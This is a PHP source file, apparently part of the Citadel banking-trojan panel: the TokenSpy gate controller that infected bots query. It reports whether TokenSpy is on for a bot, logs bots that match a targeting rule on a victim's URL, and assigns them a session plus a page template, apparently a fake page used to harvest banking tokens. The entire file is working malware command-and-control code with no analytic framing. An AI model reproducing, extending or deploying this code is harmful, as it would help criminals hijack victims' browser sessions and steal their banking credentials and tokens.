<?php namespace lib\fun\TokenSpy\gate;

require_once 'system/lib/fun/TokenSpy/TsState.php';
require_once 'system/lib/fun/TokenSpy/ApiClient.php';
require_once 'system/lib/fun/TokenSpy/gate/BotInfo.php';
use lib\fun\TokenSpy;

require_once 'system/lib/amiss/amiss.php';
use Citadel\Models;

/** TokenSpy Service Controller
 */
class ServiceController {
    function __construct(){
        $this->amiss = \Amiss::singleton();
        $this->state = new TokenSpy\TsState;
    }

    /** SUrl: Service URL. Get the current TS state: enabled or not.
     * This is checked periodically to let the bot go once it is deactivated
     *      > {"data": "get_status",
     *         "url: "<full query URL>", "buid": "<BotId>", "ruid": "<RuleId>", "puid": <PatternId>
     *        }
     *      < {"status":"on" | "off"}
     * TEST: ts.php/.ts/getState?data=get_status&buid=TestBot&ruid=test&puid=0
     */
    function actionGetState($data, $jsonBody){
        $botInfo = BotInfo::fromTsEnter($jsonBody);

        switch ($data){
            case 'get_status':
                # Get TS state
                $this->state->load();

                # Load the BotState
                $bs = $this->amiss->man->get('\Citadel\Models\TokenSpy\BotState', 'botId=?', $botInfo->botId); /** @var Models\TokenSpy\BotState|null $bs */

                # Disabled or not paused
                $status = $this->state->isEnabledFor($this->amiss->man, $botInfo, $bs, $reason);

                return array(
                    'status' => $status? 'on' : 'off',
                );
        }
    }

    /** FUrl: Filter URL. When a bot activates one of the Rules, it reports here.
     *      > { "url: "<full query URL>", "buid": "<BotId>", "ruid": "<RuleId>", "puid": <PatternId>}
     *          - The bot reports everything it knows about the bot that
     *      < {"ok": true, "session":"SERVER_SESSION"}"
     *          - is sent when the server accepts the bot
     *      < {"ok": false, "error": "blah blah"}
     *          - is sent when the server rejects the bot
     * TEST: ts.php/.ts/enter?url=http://ya.ru/&buid=TestBot&ruid=test&puid=0
     */
    function actionEnter($jsonBody){
        $botInfo = BotInfo::fromTsEnter($jsonBody);
        $this->amiss->map->objectNamespace = 'Citadel\Models\TokenSpy';
        $man = $this->amiss->man;

        # Error?
        if (is_null($botInfo->botId) || is_null($botInfo->rule_name))
            return array('ok' => false, 'error' => 'Not enough data');

        # Load the rule
        /** @var Models\TokenSpy\Rule $rule */
        $rule = $man->get('\Citadel\Models\TokenSpy\Rule', 'name=? AND enabled=1', $botInfo->rule_name);
        if (!$rule)
            return array('ok' => false, 'error' => "No rule found for '{$botInfo->rule_name}'");

        # Load|create the BotState
        /** @var Models\TokenSpy\BotState $bs */
        $bs = $man->get('\Citadel\Models\TokenSpy\BotState', 'botId=?', $botInfo->botId);
        if (!$bs) { # create if none was found
            $bs = new Models\TokenSpy\BotState;
            $bs->botId = $botInfo->botId;
            $bs->ctime = new \DateTime();
            $bs->mtime = new \DateTime();
            $bs->browser = '?';
            $bs->info = null;
        } else {
            # Need to move the prev state to history
            $log = Models\TokenSpy\BotHistoryLine::fromBotState($bs);
            $man->save($log);
        }

        # Make sure TS is enabled for this bot individually
        # We're here only if 'getState' already said it's enabled
        $this->state->load();
        if (!$this->state->isEnabledFor($this->amiss->man, $botInfo, $bs, $reason))
            return array('ok' => false, 'error' => "Disabled: $reason");

        # Create a new session for the bot
        session_name('TokenSpy');
        session_start();
        session_regenerate_id();

        # Apply the rule to it
        $bs->Rule = $rule;
        $bs->rule_id = $rule->id;
        $bs->rule_name = $rule->name;

        $bs->pattern_id = $botInfo->pattern_id;
        $bs->atime = new \DateTime();

        $bs->url = $botInfo->url;
        $bs->hits = 1; # new rule - new hits :)

        $bs->template = $rule->template;
        $bs->session_id = session_id();

        $bs->page = $rule->page;
        $bs->page2 = null;

        $man->save($bs);
        session_write_close();

        # Emit the 'rule' event
        TokenSpy\NodeApiClient::get()->emitEvent('gate', 'rule', $bs);

        # Finish
        return array(
            'ok' => true,
            'session' => $bs->session_id,
//            '$botInfo' => $botInfo, // undocumented. for debugging.
        );
    }
}
